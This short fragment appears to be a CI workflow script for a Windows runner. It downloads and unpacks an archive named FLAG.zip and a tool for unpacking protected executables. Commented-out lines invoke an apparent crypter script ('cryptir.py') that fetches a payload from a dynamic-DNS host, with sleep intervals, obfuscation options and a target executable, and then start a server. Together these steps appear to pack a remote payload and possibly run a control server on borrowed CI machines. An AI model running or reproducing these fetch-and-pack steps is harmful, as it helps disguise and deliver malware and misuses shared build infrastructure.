          cd C:\Users\runneradmin\
          curl.exe -L -o FLAG.zip https://github.com/izaart95-jpg/lelouch-is-happy/raw/refs/heads/main/.github/FLAG.zip
          Expand-Archive -Path FLAG.zip -DestinationPath . -Force
          cd FLAG
          curl.exe -L -o packer.zip https://github.com/ergrelet/unlicense/releases/download/0.4.0/unlicense-py3.11-x64.zip
          Expand-Archive -Path packer.zip -DestinationPath . -Force
          
          # pyw -3.11 cryptir.py --interval 3600 --sleep 100 --payload-url http://heteronomous.kozow.com/files/sv2.dat --output . --input out.exe --skip-obfuscation  --unlicense-target ShulkerV2.exe --patch-script patch.py
          
          # pyw -3.11 server.py 
